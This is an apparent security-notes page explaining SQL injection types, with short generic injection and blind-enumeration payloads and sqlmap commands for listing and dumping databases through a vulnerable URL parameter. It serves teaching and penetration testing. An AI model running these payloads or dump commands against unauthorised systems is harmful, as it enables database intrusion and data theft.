# 💉 SQLi

SQL injections (SQLi) is a type of vulnerability that allows the execution of malicious queries.

Types of SQLi:

- In-Band SQLi
- Blind SQLi
- Out-of-band SQLi

## In-Band SQL Injection

In-band SQLi are based on the output of the query that is showed directly to the user.

This attack allows to extract easily a lot of data from the database.

- Union based: the attacker uses the UNION operator to read data from additional tables.
- Error based: the server returns the database errors allowing an easier interaction for the attacker.

Common payloads

```sql
OR 1 = 1; --
UNION 1,2,3; --
```

## Blind SQLi

In blind SQLi no direct feedbacks are returned from the server.

There are different ways to make a blind SQLi:

- Authentication bypass: the output is not needed because the goal is to bypass a login form.
- Boolean based: the server replies only with a boolean.
- Time based: based on the sleep function and the time needed by the query to complete.

Common payloads

```sql
UNION SELECT SLEEP(5);--
WHERE database() LIKE 'a%'
FROM information_schema.tables WHERE table_schema = 'DATABASE_NAME' and table_name like 'a%';
FROM information_schema.columns WHERE table_schema='DATABASE_NAME' and table_name='DATABASE_TABLE' and column_name like 'a%';
```

Enumeratation example

```sql
WHERE database() LIKE 'a%'
WHERE database() LIKE 'b%'
WHERE database() LIKE 'c%'
WHERE database() LIKE 'd%'

WHERE database() LIKE 'da%'
WHERE database() LIKE 'db%'

WHERE database() LIKE 'dba%'
WHERE database() LIKE 'dbb%'
...
```

## Out-of-band SQLi

Out-Of-Band attacks are based on two different channels: one for the injection and the other to check the output.

## Warnings

:::caution
This is a list of few important warnings about SQL queries and SQLi.
:::

### SQL is not case sensitive

SQL clauses and schema values are not case sensitive.

```sql
-- all equals
SELECT * FROM USERS WHERE USERNAME='admin';
select * from users where username='admin';
Select * From Users Where Username='admin';
SeLeCt * FrOm UsErs WhErE UsErNaMe='admin';
```

### Comments

A single space after the double slash could be needed.
For example, in MySQL is mandatory.

```sql
; -- this is a comment
; --this could not be a comment
```

### Quotes

Single quotes are not always interchangeable with double quotes.
For example, PostgreSQL allows only single quotes for values and double quotes for schema names.

```sql
select "column" from "table" where "column"='value';
```

## sqlmap

<Image src={require("./assets/sqlmap.png").default} />

Use `-u` to define the target url and `--batch` to use the default behavior without asking for input.

In the next commands, `id` is a query parameter that is vulnerable to SQL injection.

Enumerate databases.

```bash
sqlmap -u "http://website.com/?id=1" --batch --dbs
```

Enumerate tables of a specific database.

```bash
sqlmap -u "http://website.com/?id=1" --batch --tables -D db_name
```

Enumerate tables content of a specific database.

```bash
sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name
```

Enumerate content by specifying table, column, and database.

```bash
sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name -T table_name -C col_name
```

### sqlmap over websockets

sqlmap may not support all types of requests, including those made over websockets. Also, working with complex targets can sometimes be cumbersome using sqlmap alone.

To simplify the process, it is possible to set up a fake server as an intermediary. In this way, sqlmap would make a request to the fake server using a common format, and the fake server would then make the more complex request to the actual target.

<Image src={require("./assets/sqlmap_over_websockets.png").default} />

<Gist id="4adec402e51df2bf3e35066172abaebf" />
